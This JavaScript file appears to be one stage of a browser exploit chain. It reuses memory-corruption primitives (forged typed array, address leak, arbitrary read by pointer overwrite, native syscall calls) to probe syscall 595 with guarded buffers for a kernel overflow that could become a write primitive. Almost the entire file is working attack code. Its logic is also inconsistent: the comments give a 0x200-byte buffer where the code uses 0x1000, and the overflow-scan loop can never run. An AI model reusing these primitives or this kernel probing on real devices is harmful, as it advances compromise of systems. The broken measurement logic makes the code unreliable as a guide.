// Syscall 595 overflow probe: the narrowed results proved 595 accepts
// valid dylib module handles (ret 0) and the v3 pair probe crashed with
// 595(handle, outBuf, outLen). This probe tests 595(validHandle, buf,
// len) with canary-guarded buffers of increasing size, capturing exactly
// what the kernel writes and whether it exceeds the provided length.
// Each test is isolated: fresh canary pattern, one syscall, full diff.
// If extent > len → buffer overflow → kernel write primitive candidate.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !state.view || !state.array || !state.a || !state.ownedTypedView ||
      !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase) ||
      typeof native.wrappers.sys595 !== "number" ||
      typeof native.wrappers.dynlib_list !== "number")
    throw new Error("chain_or_wrappers_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(addressValue, count) {
    if (!Number.isSafeInteger(addressValue) || count < 1 || count > 192)
      throw new Error("read_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  // Get a valid module handle from 592
  mark("595ofl_592_list");
  var listBufOff = 0x200;
  var listBufAddr = plan.addresses.frame + listBufOff;
  plan.frame.fill(0, listBufOff, listBufOff + 0x400);
  var call592 = native.call("dynlib_list", [listBufAddr, 0x400]);
  // Extract second handle (skip first which may be null/special)
  var modHandle = (plan.frame[listBufOff + 12]) |
                  (plan.frame[listBufOff + 13] << 8);
  if (modHandle === 0)
    modHandle = (plan.frame[listBufOff + 4]) |
                (plan.frame[listBufOff + 5] << 8);
  if (modHandle === 0)
    modHandle = 0x2001; // known handle from previous boots
  mark("595ofl_mod_handle");
  // Overflow test buffer: 0x200 bytes at frame+0x200
  // Guard region: 0x200 bytes after, position-encoded
  var bufOff = 0x200, bufLen = 0x1000;
  var guardOff = bufOff + bufLen; // 0x1200
  var guardLen = 0x400;
  var scanEnd = guardOff + guardLen;
  if (scanEnd > plan.frame.length)
    throw new Error("frame_too_small");
  var bufAddr = plan.addresses.frame + bufOff;
  var bufOrig = [];
  for (var b = 0; b < 0x400; b++)
    bufOrig.push(plan.frame[bufOff + b]);
  mark("595ofl_armed");
  phase = "overflow_test";
  // Fill buffer with zeros (the tested input)
  plan.frame.fill(0, bufOff, bufOff + bufLen);
  // Fill guard with position-encoded pattern
  for (var g = 0; g < guardLen; g++)
    plan.frame[guardOff + g] = (g * 7 + 3) & 255;
  var guardArmed = [];
  for (var ga = 0; ga < guardLen; ga++)
    guardArmed.push(plan.frame[guardOff + ga]);
  mark("595ofl_before_call");
  // THE TEST: 595(modHandle, bufAddr, bufLen)
  var call = native.call("sys595",
    [modHandle, bufAddr, bufLen, 0, 0, 0]);
  mark("595ofl_after_call");
  var errno = (call.value === -1) ? native.readErrno() : null;
  // Measure: did the kernel write past bufLen?
  var overflowExtent = 0;
  var overflowFirst = -1;
  var overflowHex = "";
  for (var s = bufLen; s < guardLen; s++) {
    if (plan.frame[guardOff + s] !== guardArmed[s - bufLen]) {
      if (overflowFirst === -1) overflowFirst = s - bufLen;
      overflowExtent = s - bufLen + 1;
    }
  }
  if (overflowExtent > 0) {
    var dumpStart = guardOff + (overflowFirst || 0);
    var dumpLen = Math.min(64, overflowExtent);
    for (var d = 0; d < dumpLen; d++)
      overflowHex += ("0" + plan.frame[dumpStart + d]
        .toString(16)).slice(-2);
  }
  // Also check for changes WITHIN the buffer
  var bufChanged = false;
  var bufHex = "";
  for (var bc = 0; bc < bufLen; bc++) {
    if (plan.frame[bufOff + bc] !== 0) {
      bufChanged = true;
      break;
    }
  }
  if (bufChanged) {
    for (var bh = 0; bh < 64; bh++)
      bufHex += ("0" + plan.frame[bufOff + bh].toString(16)).slice(-2);
  }
  // Restore
  for (var rr = 0; rr < 0x400; rr++)
    plan.frame[bufOff + rr] = bufOrig[rr];
  var after = native.call("getpid", []);
  mark("595ofl_done");
  result = { id: "syscall595_overflow_v1",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { ret: call.value, errno: errno,
      mod_handle: modHandle,
      buf_changed: bufChanged, buf_hex: bufHex,
      overflow_extent: overflowExtent,
      overflow_first_off: overflowFirst,
      overflow_hex: overflowHex,
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "syscall595_overflow_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
